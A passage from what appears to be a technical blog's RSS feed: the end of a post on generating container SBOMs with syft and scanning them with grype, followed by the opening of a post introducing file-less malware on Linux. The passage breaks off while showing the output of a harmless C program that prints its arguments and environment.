</span></span><span class="line"><span class="cl">Flask                 2.1.2                         python
</span></span><span class="line"><span class="cl">Jinja2                3.1.2                         python
</span></span><span class="line"><span class="cl">MarkupSafe            2.1.1                         python
</span></span><span class="line"><span class="cl">Werkzeug              2.1.2                         python
</span></span><span class="line"><span class="cl">base-files            11.1+deb11u3                  deb
</span></span><span class="line"><span class="cl">boto3                 1.23.9                        python
</span></span><span class="line"><span class="cl">botocore              1.26.9                        python
</span></span><span class="line"><span class="cl">certifi               2022.5.18.1                   python
</span></span><span class="line"><span class="cl">charset-normalizer    2.0.12                        python
</span></span><span class="line"><span class="cl">click                 8.1.3                         python
</span></span><span class="line"><span class="cl">dash                  0.5.11+git20200708+dd9ef66-5  deb
</span></span><span class="line"><span class="cl">idna                  3.3                           python
</span></span><span class="line"><span class="cl">importlib-metadata    4.11.4                        python
</span></span><span class="line"><span class="cl">itsdangerous          2.1.2                         python
</span></span><span class="line"><span class="cl">jmespath              1.0.0                         python
</span></span><span class="line"><span class="cl">libbz2-1.0            1.0.8-4                       deb
</span></span><span class="line"><span class="cl">libc-bin              2.31-13+deb11u3               deb
</span></span><span class="line"><span class="cl">libc6                 2.31-13+deb11u3               deb
</span></span><span class="line"><span class="cl">libcom-err2           1.46.2-2                      deb
</span></span><span class="line"><span class="cl">libcrypt1             1:4.4.18-4                    deb
</span></span><span class="line"><span class="cl">libdb5.3              5.3.28+dfsg1-0.8              deb
</span></span><span class="line"><span class="cl">libexpat1             2.2.10-2+deb11u3              deb
</span></span><span class="line"><span class="cl">libffi7               3.3-6                         deb
</span></span><span class="line"><span class="cl">libgcc-s1             10.2.1-6                      deb
</span></span><span class="line"><span class="cl">libgomp1              10.2.1-6                      deb
</span></span><span class="line"><span class="cl">libgssapi-krb5-2      1.18.3-6+deb11u1              deb
</span></span><span class="line"><span class="cl">libk5crypto3          1.18.3-6+deb11u1              deb
</span></span><span class="line"><span class="cl">libkeyutils1          1.6.1-2                       deb
</span></span><span class="line"><span class="cl">libkrb5-3             1.18.3-6+deb11u1              deb
</span></span><span class="line"><span class="cl">libkrb5support0       1.18.3-6+deb11u1              deb
</span></span><span class="line"><span class="cl">liblzma5              5.2.5-2.1~deb11u1             deb
</span></span><span class="line"><span class="cl">libmpdec3             2.5.1-1                       deb
</span></span><span class="line"><span class="cl">libncursesw6          6.2+20201114-2                deb
</span></span><span class="line"><span class="cl">libnsl2               1.3.0-2                       deb
</span></span><span class="line"><span class="cl">libpython3.9-minimal  3.9.2-1                       deb
</span></span><span class="line"><span class="cl">libreadline8          8.1-1                         deb
</span></span><span class="line"><span class="cl">libsqlite3-0          3.34.1-3                      deb
</span></span><span class="line"><span class="cl">libssl1.1             1.1.1n-0+deb11u2              deb
</span></span><span class="line"><span class="cl">libstdc++6            10.2.1-6                      deb
</span></span><span class="line"><span class="cl">libtinfo6             6.2+20201114-2                deb
</span></span><span class="line"><span class="cl">libtirpc3             1.3.1-1                       deb
</span></span><span class="line"><span class="cl">libuuid1              2.36.1-8+deb11u1              deb
</span></span><span class="line"><span class="cl">netbase               6.3                           deb
</span></span><span class="line"><span class="cl">openssl               1.1.1n-0+deb11u2              deb
</span></span><span class="line"><span class="cl">pip                   22.0.4                        python
</span></span><span class="line"><span class="cl">pip                   22.1.1                        python
</span></span><span class="line"><span class="cl">python-dateutil       2.8.2                         python
</span></span><span class="line"><span class="cl">python3-distutils     3.9.2-1                       deb
</span></span><span class="line"><span class="cl">requests              2.27.1                        python
</span></span><span class="line"><span class="cl">s3transfer            0.5.2                         python
</span></span><span class="line"><span class="cl">setuptools            58.1.0                        python
</span></span><span class="line"><span class="cl">six                   1.16.0                        python
</span></span><span class="line"><span class="cl">tzdata                2021a-1+deb11u3               deb
</span></span><span class="line"><span class="cl">urllib3               1.26.9                        python
</span></span><span class="line"><span class="cl">wheel                 0.37.1                        python
</span></span><span class="line"><span class="cl">zipp                  3.8.0                         python
</span></span><span class="line"><span class="cl">zlib1g                1:1.2.11.dfsg-2+deb11u1       deb
</span></span></code></pre></div><p>By default, syft parses and analyses the final layer of the container and displays the tabular result on the standard output (stdout). This is good if we just want to see the SBOM ourselves and not want to share it with other tools or people. To save the output to a file you can use <code>--file</code> option and you can also specify another formats that are widely used by community with <code>-o</code> or <code>--output</code> flag. Below bash script will create <code>cyclonedx-json</code> , <code>github-json</code>,  <code>spdx-json</code>and <code>syft-json</code>  format SBOMs and also store them in their respective files.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">mkdir -p generated_sboms<span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="k">for</span> i in sbom_<span class="o">{</span>ubuntu,distroless,alpine<span class="o">}</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="k">do</span>
</span></span><span class="line"><span class="cl">mkdir -p generated_sboms/<span class="nv">$i</span>
</span></span><span class="line"><span class="cl"><span class="nb">echo</span> <span class="nv">$i</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">syft <span class="nv">$i</span> <span class="se">\
</span></span></span><span class="line"><span class="cl"><span class="se"></span>	-o syft-json<span class="o">=</span>generated_sboms/<span class="nv">$i</span>/syft.json <span class="se">\
</span></span></span><span class="line"><span class="cl"><span class="se"></span>	-o spdx-json<span class="o">=</span>generated_sboms/<span class="nv">$i</span>/spdx.json <span class="se">\
</span></span></span><span class="line"><span class="cl"><span class="se"></span>	-o github-json<span class="o">=</span>generated_sboms/<span class="nv">$i</span>/github.json <span class="se">\
</span></span></span><span class="line"><span class="cl"><span class="se"></span>	-o cyclonedx-json<span class="o">=</span>generated_sboms/<span class="nv">$i</span>/cyclonedx.json
</span></span><span class="line"><span class="cl"><span class="k">done</span>
</span></span></code></pre></div><p>Output of the above script provides us with package count for each image and it is clear that the ubuntu has most of them as it is a full fledged distro with a lot of system files, manpages, etc&hellip; and distroless images have the least one. The idea of distroless is somewhat over-hyped in the world of containers and sometimes it can be related with
security ideas of minimum attack surface. <a href="https://www.redhat.com/en/blog/why-distroless-containers-arent-security-solution-you-think-they-are">Here is a RedHat article</a> that try to give a clear understanding of the benefits of distroless containers and myths around it.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-txt" data-lang="txt"><span class="line"><span class="cl">sbom_ubuntu
</span></span><span class="line"><span class="cl"> ✔ Loaded image
</span></span><span class="line"><span class="cl"> ✔ Parsed image
</span></span><span class="line"><span class="cl"> ✔ Cataloged packages      [265 packages]
</span></span><span class="line"><span class="cl">sbom_distroless
</span></span><span class="line"><span class="cl"> ✔ Loaded image
</span></span><span class="line"><span class="cl"> ✔ Parsed image
</span></span><span class="line"><span class="cl"> ✔ Cataloged packages      [69 packages]
</span></span><span class="line"><span class="cl">sbom_alpine
</span></span><span class="line"><span class="cl"> ✔ Loaded image
</span></span><span class="line"><span class="cl"> ✔ Parsed image
</span></span><span class="line"><span class="cl"> ✔ Cataloged packages      [71 packages]
</span></span></code></pre></div><p>And it&rsquo;ll create a directory with organised json files</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-txt" data-lang="txt"><span class="line"><span class="cl"># tree generated_sboms/
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">generated_sboms/
</span></span><span class="line"><span class="cl">├── sbom_alpine
</span></span><span class="line"><span class="cl">│   ├── cyclonedx.json
</span></span><span class="line"><span class="cl">│   ├── github.json
</span></span><span class="line"><span class="cl">│   ├── spdx.json
</span></span><span class="line"><span class="cl">│   └── syft.json
</span></span><span class="line"><span class="cl">├── sbom_distroless
</span></span><span class="line"><span class="cl">│   ├── cyclonedx.json
</span></span><span class="line"><span class="cl">│   ├── github.json
</span></span><span class="line"><span class="cl">│   ├── spdx.json
</span></span><span class="line"><span class="cl">│   └── syft.json
</span></span><span class="line"><span class="cl">└── sbom_ubuntu
</span></span><span class="line"><span class="cl">    ├── cyclonedx.json
</span></span><span class="line"><span class="cl">    ├── github.json
</span></span><span class="line"><span class="cl">    ├── spdx.json
</span></span><span class="line"><span class="cl">    └── syft.json
</span></span></code></pre></div><p>Now we have our sbom files and we can share these files to other people who need it. It can be our customers, external auditors, Incident response team, etc etc&hellip; Also we can use these files with another tool that can check these images for vulnerabilities. One such tool is <a href="https://github.com/anchore/grype"><strong>grype</strong></a> - A vulnerability scanner for container images and filesystems that works exceptionally with Syft. Below script will generate grype results for all the 3 images using their respective <code>spdx.json</code> files.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">mkdir -p grype_results<span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="k">for</span> i in sbom_<span class="o">{</span>ubuntu,distroless,alpine<span class="o">}</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="k">do</span>
</span></span><span class="line"><span class="cl"><span class="nb">echo</span> <span class="nv">$i</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">mkdir -p grype_results/<span class="nv">$i</span>
</span></span><span class="line"><span class="cl">grype sbom:./generated_sboms/sbom_ubuntu/spdx.json <span class="se">\
</span></span></span><span class="line"><span class="cl"><span class="se"></span>	-o json <span class="se">\
</span></span></span><span class="line"><span class="cl"><span class="se"></span>	--file grype_results/<span class="nv">$i</span>/all.json
</span></span><span class="line"><span class="cl"><span class="k">done</span>
</span></span></code></pre></div><p>Like all static analysers, this tool might generate tons of false positives. Apart from this, grype tool provides tons of configuration features that can come in handy for automations and several other usecases. A lot of other commercial and open-source tools are arising that can leverage SBOMs and can help to solve problems around licencing and policy compliene, security audits, quality assurance, etc.</p>
<h3 id="sbom-misconception">SBOM misconception</h3>
<p>There are few misconeptions or myths about SBOMs like it can :-</p>
<ol>
<li>be a roadmap to the attacker ?</li>
<li>require source code disclosure ?</li>
<li>expose my intellectual properties ? .. etc</li>
</ol>
<p><a href="https://www.ntia.gov/files/ntia/publications/sbom_myths_vs_facts_nov2021.pdf">Here is a NTIA publication</a> that covers explaination of some such myths V/S facts.</p>
]]></content:encoded>
    </item>
    
    <item>
      <title>File-less malwares: what and how</title>
      <link>https://ayedaemon.github.io/post/2022/02/fileless-malwares-how-and-why/</link>
      <pubDate>Sat, 26 Feb 2022 23:43:01 +0530</pubDate>
      
      <guid>https://ayedaemon.github.io/post/2022/02/fileless-malwares-how-and-why/</guid>
      <description>What are file-less malwares? How do they work on linux?
According to Wikipedia, file-less malware is a variant of computer related malicious software that exists exclusively as a computer memory-based artifact i.e. in RAM.
In other words, the malware/program is never written to harddisk but directly loaded in memory.
To get a better understanding of how that happens in linux, we need to understand how a normal program loads itself into memory and executes itself.</description>
      <content:encoded><![CDATA[<blockquote>
<p>What are file-less malwares? How do they work on linux?</p>
</blockquote>
<p>According to Wikipedia, <strong>file-less malware</strong> is a variant of computer related malicious software that exists exclusively as a computer memory-based artifact i.e. in RAM.</p>
<p>In other words, the malware/program is never written to harddisk but directly loaded in memory.</p>
<p><img loading="lazy" src="https://media.giphy.com/media/521JLj0YGzz6AEWsZ5/giphy.gif" alt="How???"  />
</p>
<p>To get a better understanding of how that happens in linux, we need to understand how a normal program loads itself into memory and executes itself. If you already know this, feel free to skip next section.</p>
<h3 id="how-normal-program-loads-and-executes-itself">How normal program loads and executes itself?</h3>
<p>This is a &ldquo;HUGE&rdquo; topic for a mere blog post. So we&rsquo;ll just scratch the surface and understand about ELF files. ELF Files are main binary format in use on modern Linux systems, and support for it is implemented in the file <a href="https://elixir.bootlin.com/linux/v5.16.10/source/fs/binfmt_elf.c">fs/binfmt_elf.c</a>.</p>
<p>Let&rsquo;s build our own C program to generate an ELF binary so we can follow and know what we are doing.</p>
<p>Create a C program file with <code>vim not_hello_world.c</code>, and paste the below code into it.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="cp">#include</span> <span class="cpf">&lt;stdio.h&gt;</span><span class="cp">
</span></span></span><span class="line"><span class="cl"><span class="cp"></span>
</span></span><span class="line"><span class="cl"><span class="kt">int</span> <span class="nf">main</span><span class="p">(</span><span class="kt">int</span> <span class="n">argc</span><span class="p">,</span> <span class="kt">char</span><span class="o">*</span> <span class="n">argv</span><span class="p">[],</span> <span class="kt">char</span><span class="o">*</span> <span class="n">envp</span><span class="p">[])</span>
</span></span><span class="line"><span class="cl"><span class="p">{</span>
</span></span><span class="line"><span class="cl">  <span class="c1">// Prints total argument count passed to executable
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>	<span class="nf">printf</span><span class="p">(</span><span class="s">&#34;Argument count : %2d</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">,</span> <span class="n">argc</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">  <span class="c1">// Prints the arguments list along with memory location
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>	<span class="nf">printf</span><span class="p">(</span><span class="s">&#34;Arguments list :</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">	<span class="k">for</span><span class="p">(</span><span class="kt">int</span> <span class="n">i</span><span class="o">=</span><span class="mi">0</span><span class="p">;</span> <span class="n">i</span><span class="o">&lt;</span><span class="n">argc</span><span class="p">;</span> <span class="n">i</span><span class="o">++</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">	<span class="p">{</span>
</span></span><span class="line"><span class="cl">		<span class="nf">printf</span><span class="p">(</span><span class="s">&#34;</span><span class="se">\t</span><span class="s">argv[%1$d] =[ %2$p ]==&gt; %2$s</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">,</span> <span class="n">i</span><span class="p">,</span> <span class="n">argv</span><span class="p">[</span><span class="n">i</span><span class="p">]);</span>
</span></span><span class="line"><span class="cl">	<span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">  <span class="c1">// Prints all the environment variables passed to executable
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>	<span class="nf">printf</span><span class="p">(</span><span class="s">&#34;Environment list :</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">	<span class="k">for</span><span class="p">(</span><span class="kt">int</span> <span class="n">i</span><span class="o">=</span><span class="mi">0</span><span class="p">;</span> <span class="n">envp</span><span class="p">[</span><span class="n">i</span><span class="p">];</span> <span class="n">i</span><span class="o">++</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">	<span class="p">{</span>
</span></span><span class="line"><span class="cl">		<span class="nf">printf</span><span class="p">(</span><span class="s">&#34;</span><span class="se">\t</span><span class="s">envp[%1$d] =[ %2$p ]==&gt; %2$s</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">,</span> <span class="n">i</span><span class="p">,</span> <span class="n">envp</span><span class="p">[</span><span class="n">i</span><span class="p">]);</span>
</span></span><span class="line"><span class="cl">	<span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span></code></pre></div><p>The above code will print out the argc, argv and envp values to the standard output.</p>
<p><strong>Compile it</strong> : <code>gcc not_hello_world.c -o not_hello_world.o</code></p>
<p><strong>Check file type</strong> : <code>file not_hello_world.o</code></p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">not_hello_world.o: ELF 64-bit LSB shared object, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=82cad832f6d9b9a2d071be6bca3ccab87c8c71f6, for GNU/Linux 3.2.0, not stripped
</span></span></code></pre></div><p><strong>Run it</strong> : <code>./not_hello_world.o 12345 123 12345678901234567890 1234</code></p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-gdscript3" data-lang="gdscript3"><span class="line"><span class="cl"><span class="n">Argument</span> <span class="n">count</span> <span class="p">:</span>  <span class="mi">5</span>
</span></span><span class="line"><span class="cl"><span class="n">Arguments</span> <span class="n">list</span> <span class="p">:</span>
</span></span><span class="line"><span class="cl">	<span class="n">argv</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">=</span><span class="p">[</span> <span class="mh">0x7ffd3bd9370c</span> <span class="p">]</span><span class="o">==&gt;</span> <span class="o">./</span><span class="n">not_hello_world</span><span class="o">.</span><span class="n">o</span>
</span></span><span class="line"><span class="cl">	<span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span> <span class="o">=</span><span class="p">[</span> <span class="mh">0x7ffd3bd93720</span> <span class="p">]</span><span class="o">==&gt;</span> <span class="mi">12345</span>
</span></span><span class="line"><span class="cl">	<span class="n">argv</span><span class="p">[</span><span class="mi">2</span><span class="p">]</span> <span class="o">=</span><span class="p">[</span> <span class="mh">0x7ffd3bd93726</span> <span class="p">]</span><span class="o">==&gt;</span> <span class="mi">123</span>
</span></span><span class="line"><span class="cl">	<span class="n">argv</span><span class="p">[</span><span class="mi">3</span><span class="p">]</span> <span class="o">=</span><span class="p">[</span> <span class="mh">0x7ffd3bd9372a</span> <span class="p">]</span><span class="o">==&gt;</span> <span class="mi">12345678901234567890</span>
</span></span><span class="line"><span class="cl">	<span class="n">argv</span><span class="p">[</span><span class="mi">4</span><span class="p">]</span> <span class="o">=</span><span class="p">[</span> <span class="mh">0x7ffd3bd9373f</span> <span class="p">]</span><span class="o">==&gt;</span> <span class="mi">1234</span>
</span></span><span class="line"><span class="cl"><span class="ne">Environment</span> <span class="n">list</span> <span class="p">:</span>
</span></span><span class="line"><span class="cl">	<span class="n">envp</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">=</span><span class="p">[</span> <span class="mh">0x7ffd3bd93744</span> <span class="p">]</span><span class="o">==&gt;</span> <span class="n">SHELL</span><span class="o">=/</span><span class="n">bin</span><span class="o">/</span><span class="n">bash</span>
</span></span><span class="line"><span class="cl">	<span class="n">envp</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span> <span class="o">=</span><span class="p">[</span> <span class="mh">0x7ffd3bd93754</span> <span class="p">]</span><span class="o">==&gt;</span> <span class="n">LANGUAGE</span><span class="o">=</span><span class="n">en_US</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">	<span class="n">envp</span><span class="p">[</span><span class="mi">2</span><span class="p">]</span> <span class="o">=</span><span class="p">[</span> <span class="mh">0x7ffd3bd93764</span> <span class="p">]</span><span class="o">==&gt;</span> <span class="n">PWD</span><span class="o">=/</span><span class="n">home</span><span class="o">/</span><span class="n">vagrant</span><span class="o">/</span><span class="n">workspace</span><span class="o">/</span><span class="n">blog_junk</span>
</span></span><span class="line"><span class="cl">	<span class="n">envp</span><span class="p">[</span><span class="mi">3</span><span class="p">]</span> <span class="o">=</span><span class="p">[</span> <span class="mh">0x7ffd3bd9378a</span> <span class="p">]</span><span class="o">==&gt;</span> <span class="n">LOGNAME</span><span class="o">=</span><span class="n">vagrant</span>
</span></span><span class="line"><span class="cl">	<span class="n">envp</span><span class="p">[</span><span class="mi">4</span><span class="p">]</span> <span class="o">=</span><span class="p">[</span> <span class="mh">0x7ffd3bd9379a</span> <span class="p">]</span><span class="o">==&gt;</span> <span class="n">XDG_SESSION_TYPE</span><span class="o">=</span><span class="n">tty</span>
</span></span><span class="line"><span class="cl">	<span class="n">envp</span><span class="p">[</span><span class="mi">5</span><span class="p">]</span> <span class="o">=</span><span class="p">[</span> <span class="mh">0x7ffd3bd937af</span> <span class="p">]</span><span class="o">==&gt;</span> <span class="n">MOTD_SHOWN</span><span class="o">=</span><span class="n">pam</span>
</span></span><span class="line"><span class="cl">	<span class="n">envp</span><span class="p">[</span><span class="mi">6</span><span class="p">]</span> <span class="o">=</span><span class="p">[</span> <span class="mh">0x7ffd3bd937be</span> <span class="p">]</span><span class="o">==&gt;</span> <span class="n">HOME</span><span class="o">=/</span><span class="n">home</span><span class="o">/</span><span class="n">vagrant</span>
</span></span><span class="line"><span class="cl">	<span class="n">envp</span><span class="p">[</span><span class="mi">7</span><span class="p">]</span> <span class="o">=</span><span class="p">[</span> <span class="mh">0x7ffd3bd937d1</span> <span class="p">]</span><span class="o">==&gt;</span> <span class="n">LANG</span><span class="o">=</span><span class="n">en_US</span><span class="o">.</span><span class="n">UTF</span><span class="o">-</span><span class="mi">8</span>
</span></span><span class="line"><span class="cl">	<span class="n">envp</span><span class="p">[</span><span class="mi">8</span><span class="p">]</span> <span class="o">=</span><span class="p">[</span> <span class="mh">0x7ffd3bd937e2</span> <span class="p">]</span><span class="o">==&gt;</span> <span class="n">LS_COLORS</span><span class="o">=</span><span class="n">rs</span><span class="o">=</span><span class="mi">0</span><span class="p">:</span><span class="n">di</span><span class="o">=</span><span class="mi">01</span><span class="p">;</span><span class="mi">34</span><span class="p">:</span><span class="n">ln</span><span class="o">=</span><span class="mi">01</span><span class="p">;</span><span class="mi">36</span><span class="p">:</span><span class="n">mh</span><span class="o">=</span><span class="mi">00</span><span class="p">:</span><span class="n">pi</span><span class="o">=</span><span class="mi">40</span><span class="p">;</span><span class="mi">33</span><span class="p">:</span><span class="n">so</span><span class="o">=</span><span class="mi">01</span><span class="p">;</span><span class="mi">35</span><span class="p">:</span><span class="k">do</span><span class="o">=</span><span class="mi">01</span><span class="p">;</span><span class="mi">35</span><span class="p">:</span><span class="n">bd</span><span class="o">=</span><span class="mi">40</span><span class="p">;</span><span class="mi">33</span><span class="p">;</span><span class="mi">01</span><span class="p">:</span><span class="n">cd</span><span class="o">=</span><span class="mi">40</span><span class="p">;</span><span class="mi">33</span><span class="p">;</span><span class="mi">01</span><span class="p">:</span><span class="ow">or</span><span class="o">=</span><span class="mi">40</span><span class="p">;</span><span class="mi">31</span><span class="p">;</span><span class="mi">01</span><span class="p">:</span><span class="n">mi</span><span class="o">=</span><span class="mi">00</span><span class="p">:</span><span class="n">su</span><span class="o">=</span><span class="mi">37</span><span class="p">;</span><span class="mi">41</span><span class="p">:</span><span class="n">sg</span><span class="o">=</span><span class="mi">30</span><span class="p">;</span><span class="mi">43</span><span class="p">:</span><span class="n">ca</span><span class="o">=</span><span class="mi">30</span><span class="p">;</span><span class="mi">41</span><span class="p">:</span><span class="n">tw</span><span class="o">=</span><span class="mi">30</span><span class="p">;</span><span class="mi">42</span><span class="p">:</span><span class="n">ow</span><span class="o">=</span><span class="mi">34</span><span class="p">;</span><span class="mi">42</span><span class="p">:</span><span class="n">st</span><span class="o">=</span><span class="mi">37</span><span class="p">;</span><span class="mi">44</span><span class="p">:</span><span class="n">ex</span><span class="o">=</span><span class="mi">01</span><span class="p">;</span><span class="mi">32</span><span class="p">:</span><span class="o">*.</span><span class="n">tar</span><span class="o">=</span><span class="mi">01</span><span class="p">;</span><span class="mi">31</span><span class="p">:</span><span class="o">*.</span><span class="n">tgz</span><span class="o">=</span><span class="mi">01</span><span class="p">;</span><span class="mi">31</span><span class="p">:</span><span class="o">*.</span><span class="n">arc</span><span class="o">=</span><span class="mi">01</span><span class="p">;</span><span class="mi">31</span><span class="p">:</span><span class="o">*.</span><span class="n">arj</span><span class="o">=</span><span class="mi">01</span><span class="p">;</span><span class="mi">31</span><span class="p">:</span><span class="o">*.</span><span class="n">taz</span><span class="o">=</span><span class="mi">01</span><span class="p">;</span><span class="mi">31</span><span class="p">:</span><span class="o">*.</span><span class="n">lha</span><span class="o">=</span><span class="mi">01</span><span class="p">;</span><span class="mi">31</span><span class="p">:</span><span class="o">*.</span><span class="n">lz4</span><span class="o">=</span><span class="mi">01</span><span class="p">;</span><span class="mi">31</span><span class="p">:</span><span class="o">*.</span><span class="n">lzh</span><span class="o">=</span><span class="mi">01</span><span class="p">;</span><span class="mi">31</span><span class="p">:</span><span class="o">*.</span><span class="n">lzma</span><span class="o">=</span><span class="mi">01</span><span class="p">;</span><span class="mi">31</span><span class="p">:</span><span class="o">*.</span><span class="n">tlz</span><span class="o">=</span><span class="mi">01</span><span class="p">;</span><span class="mi">31</span><span class="p">:</span><span class="o">*.</span><span class="n">txz</span><span class="o">=</span><span class="mi">01</span><span class="p">;</span><span class="mi">31</span><span class="p">:</span><span class="o">*.</span><span class="n">tzo</span><span class="o">=</span><span class="mi">01</span><span class="p">;</span><span class="mi">31</span><span class="p">:</span><span class="o">*.</span><span class="n">t7z</span><span class="o">=</span><span class="mi">01</span><span class="p">;</span><span class="mi">31</span><span class="p">:</span><span class="o">*.</span><span class="n">zip</span><span class="o">=</span><span class="mi">01</span><span class="p">;</span><span class="mi">31</span><span class="p">:</span><span class="o">*.</span><span class="n">z</span><span class="o">=</span><span class="mi">01</span><span class="p">;</span><span class="mi">31</span><span class="p">:</span><span class="o">*.</span><span class="n">dz</span><span class="o">=</span><span class="mi">01</span><span class="p">;</span><span class="mi">31</span><span class="p">:</span><span class="o">*.</span><span class="n">gz</span><span class="o">=</span><span class="mi">01</span><span class="p">;</span><span class="mi">31</span><span class="p">:</span><span class="o">*.</span><span class="n">lrz</span><span class="o">=</span><span class="mi">01</span><span class="p">;</span><span class="mi">31</span><span class="p">:</span><span class="o">*.</span><span class="n">lz</span><span class="o">=</span><span class="mi">01</span><span class="p">;</span><span class="mi">31</span><span class="p">:</span><span class="o">*.</span><span class="n">lzo</span><span class="o">=</span><span class="mi">01</span><span class="p">;</span><span class="mi">31</span><span class="p">:</span><span class="o">*.</span><span class="n">xz</span><span class="o">=</span><span class="mi">01</span><span class="p">;</span><span class="mi">31</span><span class="p">:</span><span class="o">*.</span><span class="n">zst</span><span class="o">=</span><span class="mi">01</span><span class="p">;</span><span class="mi">31</span><span class="p">:</span><span class="o">*.</span><span class="n">tzst</span><span class="o">=</span><span class="mi">01</span><span class="p">;</span><span class="mi">31</span><span class="p">:</span><span class="o">*.</span><span class="n">bz2</span><span class="o">=</span><span class="mi">01</span><span class="p">;</span><span class="mi">31</span><span class="p">:</span><span class="o">*.</span><span class="n">bz</span><span class="o">=</span><span class="mi">01</span><span class="p">;</span><span class="mi">31</span><span class="p">:</span><span class="o">*.</span><span class="n">tbz</span><span class="o">=</span><span class="mi">01</span><span class="p">;</span><span class="mi">31</span><span class="p">:</span><span class="o">*.</span><span class="n">tbz2</span><span class="o">=</span><span class="mi">01</span><span class="p">;</span><span class="mi">31</span><span class="p">:</span><span class="o">*.</span><span class="n">tz</span><span class="o">=</span><span class="mi">01</span><span class="p">;</span><span class="mi">31</span><span class="p">:</span><span class="o">*.</span><span class="n">deb</span><span class="o">=</span><span class="mi">01</span><span class="p">;</span><span class="mi">31</span><span class="p">:</span><span class="o">*.</span><span class="n">rpm</span><span class="o">=</span><span class="mi">01</span><span class="p">;</span><span class="mi">31</span><span class="p">:</span><span class="o">*.</span><span class="n">jar</span><span class="o">=</span><span class="mi">01</span><span class="p">;</span><span class="mi">31</span><span class="p">:</span><span class="o">*.</span><span class="n">war</span><span class="o">=</span><span class="mi">01</span><span class="p">;</span><span class="mi">31</span><span class="p">:</span><span class="o">*.</span><span class="n">ear</span><span class="o">=</span><span class="mi">01</span><span class="p">;</span><span class="mi">31</span><span class="p">:</span><span class="o">*.</span><span class="n">sar</span><span class="o">=</span><span class="mi">01</span><span class="p">;</span><span class="mi">31</span><span class="p">:</span><span class="o">*.</span><span class="n">rar</span><span class="o">=</span><span class="mi">01</span><span class="p">;</span><span class="mi">31</span><span class="p">:</span><span class="o">*.</span><span class="n">alz</span><span class="o">=</span><span class="mi">01</span><span class="p">;</span><span class="mi">31</span><span class="p">:</span><span class="o">*.</span><span class="n">ace</span><span class="o">=</span><span class="mi">01</span><span class="p">;</span><span class="mi">31</span><span class="p">:</span><span class="o">*.</span><span class="n">zoo</span><span class="o">=</span><span class="mi">01</span><span class="p">;</span><span class="mi">31</span><span class="p">:</span><span class="o">*.</span><span class="n">cpio</span><span class="o">=</span><span class="mi">01</span><span class="p">;</span><span class="mi">31</span><span class="p">:</span><span class="o">*.</span><span class="mi">7</span><span class="n">z</span><span class="o">=</span><span class="mi">01</span><span class="p">;</span><span class="mi">31</span><span class="p">:</span><span class="o">*.</span><span class="n">rz</span><span class="o">=</span><span class="mi">01</span><span class="p">;</span><span class="mi">31</span><span class="p">:</span><span class="o">*.</span><span class="n">cab</span><span class="o">=</span><span class="mi">01</span><span class="p">;</span><span class="mi">31</span><span class="p">:</span><span class="o">*.</span><span class="n">wim</span><span class="o">=</span><span class="mi">01</span><span class="p">;</span><span class="mi">31</span><span class="p">:</span><span class="o">*.</span><span class="n">swm</span><span class="o">=</span><span class="mi">01</span><span class="p">;</span><span class="mi">31</span><span class="p">:</span><span class="o">*.</span><span class="n">dwm</span><span class="o">=</span><span class="mi">01</span><span class="p">;</span><span class="mi">31</span><span class="p">:</span><span class="o">*.</span><span class="n">esd</span><span class="o">=</span><span class="mi">01</span><span class="p">;</span><span class="mi">31</span><span class="p">:</span><span class="o">*.</span><span class="n">jpg</span><span class="o">=</span><span class="mi">01</span><span class="p">;</span><span class="mi">35</span><span class="p">:</span><span class="o">*.</span><span class="n">jpeg</span><span class="o">=</span><span class="mi">01</span><span class="p">;</span><span class="mi">35</span><span class="p">:</span><span class="o">*.</span><span class="n">mjpg</span><span class="o">=</span><span class="mi">01</span><span class="p">;</span><span class="mi">35</span><span class="p">:</span><span class="o">*.</span><span class="n">mjpeg</span><span class="o">=</span><span class="mi">01</span><span class="p">;</span><span class="mi">35</span><span class="p">:</span><span class="o">*.</span><span class="n">gif</span><span class="o">=</span><span class="mi">01</span><span class="p">;</span><span class="mi">35</span><span class="p">:</span><span class="o">*.</span><span class="n">bmp</span><span class="o">=</span><span class="mi">01</span><span class="p">;</span><span class="mi">35</span><span class="p">:</span><span class="o">*.</span><span class="n">pbm</span><span class="o">=</span><span class="mi">01</span><span class="p">;</span><span class="mi">35</span><span class="p">:</span><span class="o">*.</span><span class="n">pgm</span><span class="o">=</span><span class="mi">01</span><span class="p">;</span><span class="mi">35</span><span 